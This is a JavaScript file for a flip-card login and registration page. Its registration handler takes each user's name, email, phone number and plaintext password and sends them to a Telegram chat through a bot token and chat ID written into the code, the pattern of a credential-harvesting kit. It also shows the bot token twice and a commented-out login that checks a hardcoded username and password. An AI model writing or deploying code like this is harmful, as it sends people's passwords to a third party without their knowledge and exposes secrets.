



// fetch data 


var token = "6300760181:AAEFS9uoos4m5jGUuL7I6psBhvfgXEOAMpQ";



var fetchData = async () => {
   var res = await axios(`https://api.telegram.org/bot${token}/User/`);
   console.log(res.text)
};
fetchData();

/*var login = document.getElementById("login");

login.addEventListener("click",Login)

function Login(e) {
    e.preventDefault()
    var name = "tajbir23";
    var password = "2123";

    var userName = document.getElementById("loginUsername").value;
    var pass = document.getElementById("LoginPassword").value;

    if (userName == name && pass == password) {
        window.location.href = "index.html";
    } else {
        if(userName != name){
            alert("Your username is wrong")
        }
        else if (pass != password){
            alert("Password is wrong")
        }
        else{
            alert("Something went wrong")
        }
    }
    
}*/


var flip = document.getElementById("flip-card-inner");

function reg() {
    
    flip.classList.add("flipped")
}
function back() {
    
    flip.classList.add("flipBack")
}

// script for registration card

// select items from registration page

var username1 = document.getElementById("username");
var email1 = document.getElementById("email");
var phone1 = document.getElementById("phone");
var password1 = document.getElementById("password");
var reg1 = document.getElementById("reg");

// for telegram bot token

var botToken ="6300760181:AAEFS9uoos4m5jGUuL7I6psBhvfgXEOAMpQ"
var chatId = "1758098578"

reg1.addEventListener("click", functionRegistration)

function functionRegistration(event) {
    event.preventDefault();

    //get input value
    var name = username1.value;
    var email = email1.value;
    var num = phone1.value;
    var pass = password1.value;

    // send data to telegram bot

    var registration = `New Registration: \nName:${name} \nEmail: ${email} \nPassword: ${pass} \nNumber: ${num}`;
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(registration)}`

    // Make HTTP request to send the message
  axios
  .get(url)
  .then(function (response) {
    console.log('Message sent successfully');
    console.log(response.data);
  })
  .catch(function (error) {
    console.error('Error sending message:', error.message);
  });
}

